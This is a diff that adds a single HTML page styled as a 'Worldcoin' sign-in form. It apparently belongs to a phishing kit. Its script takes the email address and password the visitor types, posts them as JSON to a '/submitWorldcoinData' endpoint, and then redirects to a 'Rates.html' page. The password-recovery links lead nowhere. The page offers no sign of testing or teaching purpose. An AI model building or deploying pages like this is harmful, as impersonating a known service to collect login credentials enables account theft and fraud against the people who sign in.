@@ -1,0 +1,231 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Worldcoin</title>
+
+    <style>
+        body {
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+        }
+
+        form {
+            width:400px;
+            max-width:400px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            top:0;
+            left:0;
+            
+            
+        }
+        .form-container{
+        
+            margin:20px auto;
+            position:relative;
+        }
+
+        
+        h1{
+            top:0;
+            left:60px;
+            position:relative;
+            margin:0 auto;
+        }
+        h2 {
+    
+            color: #333;
+            margin:5px 0;
+        }
+
+        p {
+            color: #666;
+            margin: 5px 0;
+        }
+
+        input[type=email], input[type=password] {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            padding: 8px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            transition: border-bottom 0.3s;
+            outline: none;
+        }
+
+        input[type=email]:focus, input[type=password]:focus {
+            border-bottom: 2px solid #555;
+        }
+
+        input[type=button] {
+            border: none;
+            background-color:rgb(31, 59, 62);
+            border-radius: 50px;
+            color: white;
+            text-align: center;
+            width: 90%;
+            padding: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type=button]:hover {
+            background-color: #555;
+        }
+
+        a:link {
+            text-decoration: none;
+            color: #544f4f8b;
+        }
+
+        a:visited {
+            color: #544f4f8b;
+        }
+
+        a:hover {
+            color: #333;
+        }
+
+        center {
+            display: block;
+            text-align: center;
+        }
+
+ #togglePassword {
+    border: none;
+    position:inherit;
+    background-color:white;
+    color: rgb(178, 174, 174);
+    text-align: center;
+    padding: 8px;
+    margin:10px 0;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    outline: none;
+}
+
+#togglePassword:hover {
+    color:orange;
+    text-decoration:underline;
+}
+
+@media screen and (max-width: 600px) {
+        form {
+            width: 100%;
+            max-width: none;
+            margin: 0;
+            border-radius: 0;
+        }
+    }
+
+    .logo{
+            margin:20px auto;
+            width:60px;
+            position:relative;
+            top:0;
+            left:0;
+        }
+       
+    </style>
+
+</head>
+<body>
+
+    <form>
+        <div>
+        
+                <img src="w_logo.jpg" alt="logo" class="logo">
+         
+        <br>
+        <h2>Sign in</h2>
+         <br>
+        <p>EMAIL ADDRESS</p>
+        <input type="email" id="email" name="email" required>
+
+        <p>PASSWORD</p>
+        <input type="password" id="password" name="password" required>
+        <button type="button" id="togglePassword" onclick="togglePasswordVisibility()">SHOW</button>
+              
+        <br><br>
+        <center><a href="javascript:void(0)"><input type="button" value="Sign in" onclick="handleWorld()"></a></center>
+
+        <br><br>
+        <center><a href="#">Forgot your password?</a>   <a href="#" style="color:black;text-decoration:none;">Recover Password</a></center>
+    </form>
+</div>
+
+<script>
+    function handleWorld(){
+    myWorld();
+    window.location.replace("Rates.html");
+}
+    
+</script>
+    <script>
+     
+function myWorld() {
+    var email= document.getElementById("email").value;
+    var password= document.getElementById("password").value;
+
+    var worldcoinData= {
+        email: email,
+        password: password
+    };
+
+    var serverEndpoint = '/submitWorldcoinData'; 
+
+    fetch(serverEndpoint, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(worldcoinData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Server response:', data);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+    </script>
+
+<script>
+    function togglePasswordVisibility() {
+        var passwordInput = document.getElementById("password");
+        var toggleButton = document.getElementById("togglePassword");
+
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            toggleButton.textContent = "HIDE";
+            passwordInput.style.width="100%";
+            passwordInput.style.border="none";
+            passwordInput.style.padding="8px";
+            passwordInput.style.margin="5px 0";
+            passwordInput.style.borderSizing="borderBox";
+            passwordInput.style.transition="borderBottom 0.3s";
+            passwordInput.style.outline="none";
+            passwordInput.style.borderBottom = "2px solid #555";
+        } else {
+            passwordInput.type = "password";
+            toggleButton.textContent = "SHOW";
+            passwordInput.style.borderBottom = "1px solid #ccc"; 
+        
+        }
+    }
+</script>
+
+ 
+</body>
+</html>
